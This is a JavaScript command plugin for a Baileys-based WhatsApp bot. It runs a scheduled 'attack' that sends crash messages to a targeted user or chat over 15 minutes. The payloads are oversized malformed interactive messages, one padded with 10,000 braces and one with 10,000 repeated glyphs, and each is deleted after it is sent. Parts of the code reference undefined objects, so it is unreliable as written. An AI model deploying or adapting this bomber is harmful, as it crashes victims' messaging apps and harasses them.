import { generateWAMessageFromContent } from '@whiskeysockets/baileys';

let handler = async (m, { conn }) => {
  const jid = m.quoted?.sender || m.mentionedJid?.[0] || m.chat;
  const bot = conn.user.id;

  // Solo permite que el bot use el comando
  if (m.sender !== bot) return;

  await conn.sendMessage(m.chat, { text: '🧨 Ataque iniciado. Se enviarán 200 mensajes en 15 minutos.' }, { quoted: m });

  // ATAQUE 1 (0:00)
  conn.sendMessage(m.chat, { text: '🚀 Ataque 1 iniciado (0:00). Duración: 5 minutos.' }, { quoted: m });
  for (let round = 0; round < 10; round++) {
    setTimeout(() => {
      enviarTanda(conn, jid, round + 1, m, '1');
    }, round * 30000);
  }

  // ATAQUE 2 (a los 5 min)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 2 iniciado (5:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '2');
      }, round * 30000);
    }
  }, 5 * 60 * 1000);

  // ATAQUE 3 (a los 10 min)
  setTimeout(() => {
    conn.sendMessage(m.chat, { text: '🚀 Ataque 3 iniciado (10:00). Duración: 5 minutos.' }, { quoted: m });
    for (let round = 0; round < 10; round++) {
      setTimeout(() => {
        enviarTanda(conn, jid, round + 1, m, '3');
      }, round * 30000);
    }

    // Final
    setTimeout(() => {
      conn.sendMessage(m.chat, { text: '🎯 Ataque finalizado. 200 mensajes enviados en total.' }, { quoted: m });
    }, 5 * 60 * 1000);
  }, 10 * 60 * 1000);
};

handler.command = /^(buenas|force-beta)$/i;
export default handler;

// Funciones disponibles (simuladas con logs o placeholders si no existen)
async function InvisForce(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: 'MENSION XTRASH' },
          footer: { text: 'MENSION XERVIX' },
          carouselMessage: { cards: [] },
        },
      },
    },
  }, {});
  await zalll.relayMessage(target, msg.message, { messageId: msg.key.id });
  return msg;
}

async function loadedIos(target) {
  const msg = await conn.sendMessage(target, {
    text: "🧪 Zall :: CONCƱΣЯЯOR ::" + "𑇂".repeat(10000),
  });
  return msg;
}

async function EfceBeta(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          body: { text: 'EfceBeta' },
          footer: { text: 'Beta footer' },
          carouselMessage: { cards: [] },
        },
      },
    },
  }, {});
  await zalll.relayMessage(target, msg.message, { messageId: msg.key.id });
  return msg;
}

async function XmlCrash(target) {
  const msg = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveMessage: {
          header: { title: "Zall", hasMediaAttachment: false },
          body: { text: "Zall" },
          nativeFlowMessage: { messageParamsJson: "{".repeat(10000) },
        },
      },
    },
  }, {});
  await zalll.relayMessage(target, msg.message, {
    messageId: msg.key.id,
    participant: { jid: target },
  });
  return msg;
}

// Funciones
function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

async function enviarTanda(conn, jid, num, m, ciclo) {
  const funciones = ['InvisForce', 'loadedIos', 'EfceBeta', 'XmlCrash'];
  try {
    for (let i = 0; i < 20; i++) {
      const aleatoria = funciones[Math.floor(Math.random() * funciones.length)];
      const msg = await globalThis[aleatoria](jid);
      await conn.sendMessage(conn.user.id, { delete: msg.key });
      await delay(1000);
    }
    await conn.sendMessage(m.chat, { text: `✅ Tanda ${num}/10 del ataque ${ciclo} enviada.` }, { quoted: m });
  } catch (e) {
    console.error("❌ Error en tanda:", e);
    await conn.sendMessage(m.chat, {
      text: "❌ Error en tanda:\n" + e.message,
    }, { quoted: m });
  }
}